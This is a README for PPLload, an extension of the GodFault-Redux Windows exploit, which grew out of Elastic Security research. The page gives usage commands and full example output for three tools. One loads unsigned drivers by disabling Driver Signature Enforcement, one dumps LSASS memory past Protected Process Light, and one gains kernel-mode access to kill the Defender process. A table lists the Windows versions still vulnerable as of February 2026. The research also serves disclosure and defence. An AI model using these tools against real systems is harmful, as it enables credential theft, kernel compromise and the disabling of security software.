# PPLload

Load Unsigned Driver via GodFault-Redux Exploit.

This is a minimalist extension to Gabriel Landau's GodFault-Redux exploit which allows loading an unsigned driver on Windows 10 and Windows 11 <= 23H2.

Usage: PPLload <Driver>

The following modifications are of note:

- Removes persistent CSRSS server component, blesses calling thread only which exits when done
- Blessed thread disables DSE, normal thread loads driver, blessed thread restores DSE

Thanks to Gabriel Landau for GodFault-Redux.

# Redux

By [Gabriel Landau](https://twitter.com/GabrielLandau) at [Elastic Security](https://www.elastic.co/security-labs/).

A variant of the now-patched [PPLFault](https://github.com/gabriellandau/PPLFault) exploit which bypasses Microsoft's [mitigation for PPLFault](https://www.elastic.co/security-labs/inside-microsofts-plan-to-kill-pplfault).

## Redux

Exploits a TOCTOU in Windows Code Integrity to achieve arbitrary code execution as WinTcb-Light then dump a specified process.  For more details on the exploit, see our research:

- [The Immutable Illusion: Pwning Your Kernel with Cloud Files](https://www.elastic.co/security-labs/immutable-illusion)

### Demo

https://github.com/user-attachments/assets/b6d7bc20-18dc-4a77-a39e-c92f0c1a1fe1

### Example Output

```
PS C:\Users\user\Desktop> cmd /c ver

Microsoft Windows [Version 10.0.20348.4773]
PS C:\Users\user\Desktop> $TargetPid = (Get-Process lsass).Id
PS C:\Users\user\Desktop> (Get-NtProcess -Access QueryLimitedInformation -Pid $TargetPid).Protection

Type           Signer
----           ------
ProtectedLight Lsa


PS C:\Users\user\Desktop> dir *.dmp
PS C:\Users\user\Desktop> .\Redux.exe -v $TargetPid lsass.dmp
 [+] No cleanup necessary.  Backup does not exist.
 [+] GetShellcode: 528 bytes of shellcode written over DLL entrypoint
 [+] Benign: C:\Windows\System32\EventAggregation.dll.bak
 [+] Payload: C:\PPLFaultTemp\PPLFaultPayload.dll
 [+] Placeholder: C:\PPLFaultTemp\EventAggregationPH.dll
 [+] Acquired exclusive oplock to file: C:\Windows\System32\devobj.dll
 [+] Ready.  Spawning WinTcb.
 [+] SpawnPPL: Waiting for child process to finish.
 [+] FetchDataCallback called.
 [+] Hydrating 90112 bytes at offset 0
 [+] Switching to payload
 [+] Give the memory manager a moment to think
 [+] Emptying system working set
 [+] Working set purged
 [+] FetchDataCallback called.
 [+] Hydrating 90112 bytes at offset 0
 [+] Successfully hydrated file: C:\PPLFaultTemp\EventAggregationPH.dll
 [+] Dump saved to: lsass.dmp
 [+] Dump is 49.1 MB
 [+] Operation took 2109 ms
PS C:\Users\user\Desktop> dir *.dmp


    Directory: C:\Users\user\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         2/11/2026   4:17 PM       51500633 lsass.dmp
```

## GodFault-Redux

Exploits the same TOCTOU as Redux.  However instead of dumping a process, it migrates to CSRSS and exploits a vulnerability in `win32k!NtUserHardErrorControlCall` from [ANGRYORCHARD](https://github.com/gabriellandau/ANGRYORCHARD/blob/0a4720f7e07e86a9ac2783411b81efac14938e26/Exploit.c#L69-L81) to decrement `KTHREAD.PreviousMode` from `UserMode` (1) to `KernelMode` (0).  It proves "God Mode" access by killing a normally-unkillable process, such as `MsMpEng.exe`

### Example Output

```
PS C:\Users\user\Desktop> (Get-Process MsMpEng).Id
844
PS C:\Users\user\Desktop> taskkill /f /pid 844
ERROR: The process with PID 844 could not be terminated.
Reason: Access is denied.
PS C:\Users\user\Desktop> .\GodFault-Redux.exe -k MsMpEng.exe
 [+] Thread 5668 (KTHREAD FFFFB9043ACB2080) has been blessed by GodFault
 [+] Initial blessing successful
 [+] Testing post-exploit ability to acquire PROCESS_ALL_ACCESS to System: Success
 [+] Opened \Device\PhysicalMemory.  Handle is 0x14c
 [+] Opened System process as PROCESS_ALL_ACCESS.  Handle is 0x148
 [+] GodFault killed process 844: MsMpEng.exe
PS C:\Users\user\Desktop> (Get-Process MsMpEng).Id
Get-Process : Cannot find a process with the name "MsMpEng". Verify the process name and call the cmdlet again.
At line:1 char:2
+ (Get-Process MsMpEng).Id
+  ~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (MsMpEng:String) [Get-Process], ProcessCommandException
    + FullyQualifiedErrorId : NoProcessFoundForGivenName,Microsoft.PowerShell.Commands.GetProcessCommand
```

## Affected Platforms as of February 2026

| Operating System | Lifecycle | Fix Status |
| :---- | :---- | :---- |
| Windows 11 24H2 | [Mainstream Support](https://learn.microsoft.com/en-us/lifecycle/products/windows-11-home-and-pro) | ✔ Fixed |
| Windows 10 Enterprise LTSC 2021 | [Mainstream Support](https://learn.microsoft.com/en-us/lifecycle/products/windows-10-enterprise-ltsc-2021) | ❌ Still functional as of February 2026 (19044.6937) |
| Windows Server 2025 | [Mainstream Support](https://learn.microsoft.com/en-us/lifecycle/products/windows-server-2025) | ✔ Fixed |
| Windows Server 2022 | [Mainstream Support](https://learn.microsoft.com/en-us/lifecycle/products/windows-server-2022) | ❌ Still functional as of February 2026 (20348.4773) |
| Windows Server 2019 | [Extended Support](https://learn.microsoft.com/en-us/lifecycle/products/windows-server-2019) | ❌ Still functional as of February 2026 (17763.8389) |

# License

Redux is covered by the [ELv2 license](LICENSE.txt).  It uses [phnt](https://github.com/winsiderss/systeminformer/tree/25846070780183848dc8d8f335a54fa6e636e281/phnt) from SystemInformer under the [MIT license](phnt/LICENSE.txt).

# Credits
Redux is based on our prior work, [PPLFault](https://github.com/gabriellandau/PPLFault), which was inspired by [PPLdump](https://github.com/itm4n/PPLdump) by [Clément Labro](https://infosec.exchange/@itm4n).

[ANGRYORCHARD](https://github.com/gabriellandau/ANGRYORCHARD) was created by [Austin Hudson](https://twitter.com/ilove2pwn_), who released it when Microsoft patched PPLdump.

